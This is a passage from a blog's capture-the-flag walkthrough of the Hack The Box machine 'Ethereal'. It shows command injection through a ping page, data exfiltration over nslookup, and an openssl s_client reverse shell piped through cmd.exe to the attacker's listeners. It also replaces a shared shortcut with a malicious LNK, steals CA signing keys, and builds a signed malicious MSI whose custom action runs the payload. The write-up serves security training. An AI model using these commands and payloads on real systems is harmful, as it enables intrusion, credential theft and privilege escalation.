We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string <code class="language-plaintext highlighter-rouge">Rule Name:</code> then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to <code class="language-plaintext highlighter-rouge">c:\users\public\desktop\shortcuts</code> , so we will do this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr "Rule Name:" &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt
</code></pre></div></div>
<p>Then we will list the contents of <code class="language-plaintext highlighter-rouge">c:\users\public\desktop\shortcuts</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/41.png" alt="" class="align-center"><br><br>
And we see that we have successfully written into that directory , next step is to read the file :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/42.png" alt="" class="align-center"><br><br>
It’s only allowing TCP conections to port <code class="language-plaintext highlighter-rouge">73</code> and <code class="language-plaintext highlighter-rouge">136</code> , we saw earlier that openssl was installed on the box , we can create a <code class="language-plaintext highlighter-rouge">SSL/TLS server</code> on these ports and use openssl to make the box connect back to us.<br></p>

<h2 id="generating-certs-and-setting-up-the-server">Generating certs and setting up the server</h2>
<p>First step is to generate certificates because we need them to set up the server :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/43.png" alt="" class="align-center"><br><br>
Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/44.png" alt="" class="align-center"><br><br>
<a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html" target="_blank" rel="noopener noreferrer">Read more about s_server</a>
We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.<br>
Now we need to locate openssl.exe , if we listed the contents of <code class="language-plaintext highlighter-rouge">OpenSSL-v1.1.0</code> in <code class="language-plaintext highlighter-rouge">Program Files (x86)</code> (can also be written <code class="language-plaintext highlighter-rouge">Progra~2</code>. check <a href="https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568" target="_blank" rel="noopener noreferrer">this</a>) we will get this output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/45.png" alt="" class="align-center"><br><br>
We see a directory called <code class="language-plaintext highlighter-rouge">bin</code> that’s where <code class="language-plaintext highlighter-rouge">openssl.exe</code> is located so the path is <code class="language-plaintext highlighter-rouge">c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe</code>
<br>Now everything is ready , in the ping page we will write this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136
</code></pre></div></div>
<p>Then we will check our server :
<br><img src="/images/hackthebox/ethereal/46.png" alt="" class="align-center"><br><br>
Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.<br>
<br><img src="/images/hackthebox/ethereal/47.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ethereal/48.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ethereal/49.png" alt="" class="align-center"><br><br>
alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called <code class="language-plaintext highlighter-rouge">note-draft.txt</code>:
<br><img src="/images/hackthebox/ethereal/50.png" alt="" class="align-center"><br><br></p>

<h2 id="creating-a-malicious-lnk-and-getting-user">Creating a malicious lnk and getting User</h2>
<p><br><img src="/images/hackthebox/ethereal/51.png" alt="" class="align-center"><br><br>
From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it.<br>
<br><img src="/images/hackthebox/ethereal/52.png" alt="" class="align-center"><br><br>
So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called <a href="https://github.com/Plazmaz/LNKUp" target="_blank" rel="noopener noreferrer">LNKup</a> I used it to create the payload :
<br><img src="/images/hackthebox/ethereal/53.png" alt="" class="align-center"><br><br>
To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :
<br><img src="/images/hackthebox/ethereal/54.png" alt="" class="align-center"><br><br>
Then on the ping page we will type this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136 &gt; "C:\Users\Public\Desktop\Shortcuts\rick.lnk"
</code></pre></div></div>
<p>We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old <code class="language-plaintext highlighter-rouge">lnk</code> :
<br><img src="/images/hackthebox/ethereal/55.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; copy "c:\users\public\desktop\shortcuts\rick.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; dir c:\users\public\desktop\shortcuts
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/56.png" alt="" class="align-center"><br><br>
Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :
<br><img src="/images/hackthebox/ethereal/57.png" alt="" class="align-center"><br><br>
With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.<br>
<br><img src="/images/hackthebox/ethereal/58.png" alt="" class="align-center"><br><br>
Finally we owned user !</p>

<h2 id="more-filesystem-enumeration">More Filesystem Enumeration</h2>
<p>If we checked the other drives : 
<code class="language-plaintext highlighter-rouge">fsutil fsinfo drives</code>
<br><img src="/images/hackthebox/ethereal/59.png" alt="" class="align-center"><br><br>
We will find that <code class="language-plaintext highlighter-rouge">C</code> is not the only drive and there’s also <code class="language-plaintext highlighter-rouge">D</code>.<br>
Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything.<br>
Contents of <code class="language-plaintext highlighter-rouge">D</code>:
<br><img src="/images/hackthebox/ethereal/60.png" alt="" class="align-center"><br><br>
In <code class="language-plaintext highlighter-rouge">DEV</code> there’s a directory called <code class="language-plaintext highlighter-rouge">MSIs</code> and it has a note :
<br><img src="/images/hackthebox/ethereal/61.png" alt="" class="align-center"><br><br>
So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in <code class="language-plaintext highlighter-rouge">D:\Certs</code> , <code class="language-plaintext highlighter-rouge">MyCA.cer</code> and <code class="language-plaintext highlighter-rouge">MyCA.pvk</code> , to transfer them to our box we will use <code class="language-plaintext highlighter-rouge">openssl</code> to base64 encode the certs then we can copy and decode on our box.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/62.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/63.png" alt="" class="align-center"><br><br>
Now we will go to a windows box again to create the msi</p>

<h2 id="creating-malicious-msi-and-getting-root">Creating Malicious msi and getting root</h2>
<p>In order to create the msi we will use <a href="http://wixtoolset.org/" target="_blank" rel="noopener noreferrer">wixtools</a> , you can use other msi builders but they didn’t work for me.<br>
Check <a href="https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with" target="_blank" rel="noopener noreferrer">this page</a> for some wix msi usage examples.<br>
We will create an msi that executes our lnk file :
<br><img src="/images/hackthebox/ethereal/64.png" alt="" class="align-center"><br><br></p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"Example Product Name"</span>
<span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"@_xpn_"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">"1"</span> <span class="na">Cabinet=</span><span class="s">"product.cab"</span> <span class="na">EmbedCab=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/Component&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Feature&gt;</span>
<span class="nt">&lt;Property</span> <span class="na">Id=</span><span class="s">"cmdline"</span><span class="nt">&gt;</span>cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"<span class="nt">&lt;/Property&gt;</span>
<span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">"Stage1"</span> <span class="na">Execute=</span><span class="s">"deferred"</span> <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> <span class="na">ExeCommand=</span><span class="s">'[cmdline]'</span> <span class="na">Return=</span><span class="s">"ignore"</span>
<span class="na">Impersonate=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">"Stage2"</span> <span class="na">Execute=</span><span class="s">"deferred"</span> <span class="na">Script=</span><span class="s">"vbscript"</span> <span class="na">Return=</span><span class="s">"check"</span><span class="nt">&gt;</span>
fail_here
<span class="nt">&lt;/CustomAction&gt;</span>
<span class="nt">&lt;InstallExecuteSequence&gt;</span>
<span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Stage1"</span> <span class="na">After=</span><span class="s">"InstallInitialize"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
<span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Stage2"</span> <span class="na">Before=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
<span class="nt">&lt;/InstallExecuteSequence&gt;</span>
<span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span> 
</code></pre></div></div>
<p>We will use <code class="language-plaintext highlighter-rouge">candle.exe</code> from wixtools to create a wixobject from <code class="language-plaintext highlighter-rouge">msi.xml</code>
<br><img src="/images/hackthebox/ethereal/65.png" alt="" class="align-center"><br><br>
Then we will use <code class="language-plaintext highlighter-rouge">light.exe</code> to create the msi file from the wixobject 
<br><img src="/images/hackthebox/ethereal/66.png" alt="" class="align-center"><br><br>
After that we need tools from microsoft sdk to sign our msi , first we will use <code class="language-plaintext highlighter-rouge">makecert.exe</code> to create new certs from the original certs we got from the box</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer
</code></pre></div></div>
<p>It will ask for a password we will leave it blank for no password protection :
<br><img src="/images/hackthebox/ethereal/67.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ethereal/68.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ethereal/69.png" alt="" class="align-center"><br><br>
Then we will use <code class="language-plaintext highlighter-rouge">pvk2pfx.exe</code> to create a pfx for both the cer and the pvk files :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx
</code></pre></div></div>
<p>And finally we will use <code class="language-plaintext highlighter-rouge">signtool.exe</code> to sign the msi with the pfx :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/70.png" alt="" class="align-center"><br><br>
Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in <code class="language-plaintext highlighter-rouge">c:\users\public\desktop\shortcuts\</code> because the msi is just executing that lnk. We will put the msi into <code class="language-plaintext highlighter-rouge">D:\DEV\MSIs</code>
<br><img src="/images/hackthebox/ethereal/71.png" alt="" class="align-center"><br><br>
Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi
<br><img src="/images/hackthebox/ethereal/72.png" alt="" class="align-center"><br><br>
And we got root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-09T07:00:00+02:00">March 9, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/access/" class="pagination--pager" title="Hack The Box - Access
">Previous</a>
    
    
      <a href="/hack-the-box/carrier/" class="pagination--pager" title="Hack The Box - Carrier
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
